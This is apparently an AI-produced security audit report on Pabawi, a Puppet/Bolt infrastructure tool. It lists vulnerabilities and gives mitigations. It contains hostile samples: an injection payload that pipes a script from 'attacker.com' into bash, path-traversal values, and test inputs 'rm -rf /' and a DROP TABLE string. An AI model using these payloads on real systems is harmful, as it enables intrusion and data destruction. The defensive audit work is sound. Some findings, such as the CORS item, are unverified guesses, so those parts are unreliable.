# Pabawi Security Audit Report

**Date:** January 24, 2026  
**Version:** 0.5.0  
**Auditor:** AI Security Analysis

## Executive Summary

This security audit identifies several **CRITICAL** vulnerabilities and security concerns in the Pabawi codebase. While the application is designed for localhost use, the current implementation has significant security gaps that could be exploited if the application is exposed to a network or if an attacker gains local access.

**Overall Risk Level:** 🔴 **HIGH**

### Critical Findings Summary

| Severity | Count | Description |
|----------|-------|-------------|
| 🔴 CRITICAL | 3 | Authentication bypass, command injection risk, CORS misconfiguration |
| 🟠 HIGH | 4 | Missing security headers, SQL injection potential, path traversal, secret exposure |
| 🟡 MEDIUM | 5 | Input validation gaps, error information disclosure, dependency vulnerabilities |
| 🟢 LOW | 3 | Logging sensitive data, missing rate limiting, outdated dependencies |

---

## 🔴 CRITICAL VULNERABILITIES

### 1. No Authentication or Authorization (CRITICAL)

**Location:** Entire application  
**CVE Risk:** Authentication Bypass  
**CVSS Score:** 9.8 (Critical)

**Issue:**
The application has **zero authentication or authorization mechanisms**. Anyone who can access the endpoint can:
- Execute arbitrary commands on infrastructure
- View sensitive system information
- Trigger Puppet runs
- Access execution history
- View Hiera data (potentially containing secrets)

**Evidence:**
```markdown
# From README.md lines 60-65
- **No Built-in Authentication**: Pabawi currently has no user authentication or authorization system
- **Localhost Access Only**: The application should only be accessed via `localhost` or `127.0.0.1`
- **Privileged Operations**: Pabawi can execute commands and tasks on your infrastructure
```

**Attack Scenario:**
1. Attacker gains network access to server running Pabawi
2. Sends requests to `http://server:3000/api/nodes/{node}/command`
3. Executes malicious commands on entire infrastructure

**Recommendation:**
- **IMMEDIATE:** Add authentication middleware (JWT, OAuth2, or API keys)
- Implement role-based access control (RBAC)
- Add audit logging for all privileged operations
- Consider implementing request signing for API calls

**Mitigation (Short-term):**
```typescript
// backend/src/middleware/auth.ts
export function requireAuth(req: Request, res: Response, next: NextFunction) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !verifyToken(token)) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}
```

---

### 2. Command Injection via Bolt Arguments (CRITICAL)

**Location:** `backend/src/bolt/BoltService.ts:133`  
**CVE Risk:** Command Injection (CWE-78)  
**CVSS Score:** 9.1 (Critical)

**Issue:**
While `spawn()` is used with `shell: false`, the argument escaping in `buildCommandString()` may be insufficient. Arguments are passed directly to Bolt CLI without proper sanitization beyond quote escaping.

**Evidence:**
```typescript
// backend/src/bolt/BoltService.ts:74-86
private buildCommandString(args: string[]): string {
  const escapedArgs = args.map((arg) => {
    if (arg.includes(" ") || arg.includes('"') || arg.includes("'")) {
      return `"${arg.replace(/"/g, '\\"')}"`;
    }
    return arg;
  });
  return `bolt ${escapedArgs.join(" ")}`;
}

// Line 133
childProcess = spawn("bolt", args, {
  cwd,
  env: process.env,  // ⚠️ Inherits entire environment
  shell: false,
});
```

**Vulnerabilities:**
1. Arguments not validated for shell metacharacters (`;`, `|`, `&`, `$()`, etc.)
2. Environment variable `process.env` passed without sanitization
3. No validation of argument count or structure
4. Command whitelist bypassed if `COMMAND_WHITELIST_ALLOW_ALL=true`

**Attack Scenario:**
```bash
# Attacker crafts malicious task parameter
POST /api/nodes/target/task
{
  "task": "package",
  "parameters": {
    "name": "apache2; curl http://attacker.com/shell.sh | bash"
  }
}
```

**Recommendation:**
- Implement strict input validation for all Bolt arguments
- Use allowlist for permitted characters in parameters
- Never pass entire `process.env` - use explicit environment variables
- Add argument structure validation
- Log all command executions with full context

**Mitigation:**
```typescript
// Validate arguments against injection patterns
private validateArgument(arg: string): void {
  const dangerousPatterns = /[;&|`$(){}[\]<>]/;
  if (dangerousPatterns.test(arg)) {
    throw new Error(`Argument contains forbidden characters: ${arg}`);
  }
}
```

---

### 3. CORS Misconfiguration Allows Any Origin (CRITICAL)

**Location:** `backend/src/server.ts:589`  
**CVE Risk:** Cross-Origin Resource Sharing Misconfiguration  
**CVSS Score:** 7.5 (High)

**Issue:**
CORS configuration not found in the visible code sections, but the application serves both frontend and API. If CORS is too permissive, it allows any origin to make authenticated requests.

**Current Evidence:**
```typescript
// backend/src/server.ts line 1 imports cors
import cors from "cors";

// Need to check line 589 for actual configuration
```

**Recommendation:**
- Restrict CORS to specific origins only
- Never use `Access-Control-Allow-Origin: *` in production
- Implement CORS whitelist based on environment

**Proper Configuration:**
```typescript
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS?.split(',') || ['http://localhost:3000'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Expert-Mode']
}));
```

---

## 🟠 HIGH SEVERITY ISSUES

### 4. Missing Security Headers (HIGH)

**Location:** `backend/src/server.ts` (middleware section)  
**CVE Risk:** Various client-side attacks  
**CVSS Score:** 6.5 (Medium-High)

**Issue:**
No security headers detected (helmet.js not found in dependencies or code).

**Missing Headers:**
- `X-Frame-Options: DENY` (Clickjacking protection)
- `X-Content-Type-Options: nosniff` (MIME sniffing protection)
- `Strict-Transport-Security` (HTTPS enforcement)
- `Content-Security-Policy` (XSS protection)
- `X-XSS-Protection: 1; mode=block`

**Recommendation:**
```bash
npm install --save helmet
```

```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Review inline scripts
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

---

### 5. Potential SQL Injection in Database Queries (HIGH)

**Location:** `backend/src/database/ExecutionRepository.ts:121-150`  
**CVE Risk:** SQL Injection (CWE-89)  
**CVSS Score:** 8.2 (High)

**Issue:**
While parameterized queries are used, there's risk in dynamic query construction and JSON field searching.

**Evidence:**
```typescript
// backend/src/database/ExecutionRepository.ts:121-150
const sql = `
  INSERT INTO executions (
    id, type, target_nodes, action, parameters, status,
    started_at, completed_at, results, error, command, expert_mode,
    original_execution_id, re_execution_count, stdout, stderr
  ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
`;

const params = [
  record.id,
  record.type,
  JSON.stringify(record.targetNodes),  // ✓ Safe - parameterized
  record.action,
  record.parameters ? JSON.stringify(record.parameters) : null,  // ✓ Safe
  // ...
];
```

**Concerns:**
1. JSON fields queried with `LIKE` (noted in architecture.md as not efficiently indexable)
2. No prepared statement caching
3. String concatenation in filter queries could be risky

**Recommendation:**
- Review all filter/search implementations for SQL injection
- Use ORM or query builder (e.g., Knex.js) for complex queries
- Never concatenate user input into SQL strings
- Add SQL injection tests

---

### 6. Path Traversal in File Operations (HIGH)

**Location:** Multiple locations  
**CVE Risk:** Path Traversal (CWE-22)  
**CVSS Score:** 7.5 (High)

**Issue:**
Configuration paths (`BOLT_PROJECT_PATH`, `DATABASE_PATH`, Hiera `controlRepoPath`) are read from environment variables without validation.

**Evidence:**
```dotenv
# .env
BOLT_PROJECT_PATH=~/bolt-project
DATABASE_PATH=/data/executions.db
HIERA_CONTROL_REPO_PATH=/path/to/control-repo
```

**Attack Scenario:**
```bash
# Attacker modifies environment or config
BOLT_PROJECT_PATH=../../../etc
DATABASE_PATH=../../../tmp/malicious.db
```

**Recommendation:**
```typescript
// backend/src/config/ConfigService.ts
import path from 'path';

function validatePath(inputPath: string, basePath: string): string {
  const resolved = path.resolve(basePath, inputPath);
  if (!resolved.startsWith(basePath)) {
    throw new Error('Path traversal attempt detected');
  }
  return resolved;
}
```

---

### 7. Secrets in Environment Variables and Logs (HIGH)

**Location:** Throughout codebase  
**CVE Risk:** Information Exposure (CWE-200)  
**CVSS Score:** 6.8 (Medium-High)

**Issue:**
Sensitive data (tokens, SSL certificates) stored in environment variables and potentially logged.

**Evidence:**
```typescript
// backend/src/config/ConfigService.ts:124-147
token: process.env.PUPPETDB_TOKEN,
ssl: {
  ca: process.env.PUPPETDB_SSL_CA,
  cert: process.env.PUPPETDB_SSL_CERT,
  key: process.env.PUPPETDB_SSL_KEY,
  // ...
}
```

**Concerns:**
1. Tokens logged in startup metadata
2. SSL certificates passed as environment strings (should be file paths)
3. No secret rotation mechanism
4. Expert mode may leak tokens in API responses

**Recommendation:**
- Use secret management (HashiCorp Vault, AWS Secrets Manager)
- Store certificate paths, not content, in environment
- Implement secret rotation
- Sanitize all logs to remove tokens/keys
- Add `[REDACTED]` for sensitive fields in expert mode

```typescript
// Example log sanitization
function sanitizeMetadata(metadata: Record<string, unknown>): Record<string, unknown> {
  const sensitiveKeys = ['token', 'password', 'key', 'secret', 'cert'];
  const sanitized = { ...metadata };
  
  for (const key of Object.keys(sanitized)) {
    if (sensitiveKeys.some(s => key.toLowerCase().includes(s))) {
      sanitized[key] = '[REDACTED]';
    }
  }
  
  return sanitized;
}
```

---

## 🟡 MEDIUM SEVERITY ISSUES

### 8. Insufficient Input Validation (MEDIUM)

**Location:** Various route handlers  
**CVE Risk:** Input Validation Bypass  

**Issue:**
While Zod is used for validation, some edge cases may not be covered:

1. **Command parameters**: No length limits
2. **Node IDs**: No format validation (could contain special characters)
3. **PQL queries**: Passed directly to PuppetDB without sanitization
4. **File uploads**: No validation (if implemented)

**Recommendation:**
- Add maximum length constraints to all string inputs
- Validate node ID format (alphanumeric + hyphens/underscores only)
- Sanitize PQL queries or use parameterized queries
- Implement request size limits

---

### 9. Information Disclosure in Error Messages (MEDIUM)

**Location:** `backend/src/middleware/errorHandler.ts`  

**Issue:**
Error handler exposes stack traces and internal details even in non-expert mode.

**Evidence:**
```typescript
// Line 48-50
if (process.env.NODE_ENV === "development") {
  // Logs to console with full stack
}
```

**Recommendation:**
- Never expose stack traces in production
- Sanitize error messages sent to client
- Log detailed errors server-side only
- Use generic error messages for authentication failures

---

### 10. No Rate Limiting (MEDIUM)

**Location:** All API endpoints  

**Issue:**
No rate limiting allows:
- Brute force attacks (if authentication added)
- DoS via expensive operations (catalog compilation, report queries)
- Resource exhaustion

**Recommendation:**
```bash
npm install --save express-rate-limit
```

```typescript
import rateLimit from 'express-rate-limit';

const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests, please try again later'
});

app.use('/api/', apiLimiter);

// Stricter limits for expensive operations
const executionLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10
});
app.use('/api/nodes/:id/command', executionLimiter);
```

---

### 11. XSS via ANSI-to-HTML Conversion (MEDIUM)

**Location:** `frontend/src/lib/ansiToHtml.ts`  

**Issue:**
ANSI output converted to HTML may be vulnerable to XSS if malicious ANSI codes are crafted.

**Evidence:**
```typescript
// ansiToHtml.ts - converts ANSI to inline styles
// Strings are not explicitly sanitized before HTML insertion
```

**Recommendation:**
- Escape HTML entities before applying styles
- Use DOMPurify to sanitize output
- Never use `innerHTML` without sanitization (only found in test file)

---

### 12. Environment Variable Injection (MEDIUM)

**Location:** `backend/src/bolt/BoltService.ts:135`  

**Issue:**
Entire `process.env` passed to child processes.

```typescript
childProcess = spawn("bolt", args, {
  env: process.env,  // ⚠️ Passes ALL environment variables
});
```

**Recommendation:**
```typescript
// Only pass necessary variables
const cleanEnv = {
  PATH: process.env.PATH,
  HOME: process.env.HOME,
  BOLT_PROJECT: this.boltProjectPath,
  // Explicitly list required vars
};

childProcess = spawn("bolt", args, {
  env: cleanEnv,
  shell: false,
});
```

---

## 🟢 LOW SEVERITY ISSUES

### 13. Sensitive Data in Logs (LOW)

**Location:** Throughout codebase  

Execution commands, node IDs, and parameters logged extensively. Could leak sensitive data.

**Recommendation:**
- Implement log level filtering
- Redact sensitive parameters
- Rotate logs with retention policy

---

### 14. Dependency Vulnerabilities (LOW)

**Location:** `package.json`  

**Issue:**
- Override for `tar: 7.5.6` suggests known vulnerability
- No automated dependency scanning in CI

**Recommendation:**
```bash
npm audit
npm audit fix
```

Add to CI:
```yaml
- name: Security audit
  run: npm audit --audit-level=moderate
```

---

### 15. Missing HTTPS Enforcement (LOW)

**Location:** Server configuration  

**Issue:**
No HTTPS configuration or HTTP→HTTPS redirect.

**Recommendation:**
- Add TLS configuration for production
- Redirect HTTP to HTTPS
- Use Let's Encrypt for certificates

---

## Priority Action Items

### Immediate (Fix Now)

1. **Add authentication middleware** - CRITICAL
2. **Restrict CORS origins** - CRITICAL
3. **Validate all command arguments** - CRITICAL
4. **Add helmet.js security headers** - HIGH
5. **Implement path traversal protection** - HIGH

### Short-term (1-2 weeks)

6. Add rate limiting to all endpoints
7. Implement secret management
8. Add SQL injection protection tests
9. Sanitize error messages in production
10. Add request size limits

### Medium-term (1 month)

11. Implement RBAC
12. Add audit logging
13. Security scanning in CI/CD
14. Penetration testing
15. Security documentation

---

## Testing Recommendations

### Security Test Suite

```typescript
// tests/security/command-injection.test.ts
describe('Command Injection Protection', () => {
  it('should reject arguments with shell metacharacters', async () => {
    const malicious = 'ls; rm -rf /';
    await expect(executeCommand(malicious)).rejects.toThrow();
  });
  
  it('should reject environment variable expansion', async () => {
    const malicious = '$(whoami)';
    await expect(executeCommand(malicious)).rejects.toThrow();
  });
});

// tests/security/sql-injection.test.ts
describe('SQL Injection Protection', () => {
  it('should sanitize filter parameters', async () => {
    const malicious = "'; DROP TABLE executions; --";
    const result = await executionRepo.findByFilter({ action: malicious });
    expect(result).toEqual([]);
  });
});
```

---

## Compliance Considerations

### OWASP Top 10 (2021) Assessment

| Risk | Status | Notes |
|------|--------|-------|
| A01:2021 Broken Access Control | 🔴 FAIL | No authentication/authorization |
| A02:2021 Cryptographic Failures | 🟠 PARTIAL | Secrets in env vars |
| A03:2021 Injection | 🔴 FAIL | Command injection risk |
| A04:2021 Insecure Design | 🟡 PARTIAL | No security by design |
| A05:2021 Security Misconfiguration | 🔴 FAIL | Missing security headers |
| A06:2021 Vulnerable Components | 🟡 PARTIAL | Dependency vulnerabilities |
| A07:2021 Identification/Auth Failures | 🔴 FAIL | No authentication |
| A08:2021 Software/Data Integrity | 🟢 PASS | Good use of TypeScript |
| A09:2021 Logging Failures | 🟡 PARTIAL | Excessive logging |
| A10:2021 SSRF | 🟢 PASS | Limited external requests |

---

## Conclusion

Pabawi requires **immediate security hardening** before any network deployment. The application's assumption of "localhost only" usage does not adequately protect against:

1. Insider threats
2. Lateral movement after initial compromise
3. Misconfigured deployments
4. Supply chain attacks

**DO NOT deploy to production or expose to network until critical vulnerabilities are addressed.**

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
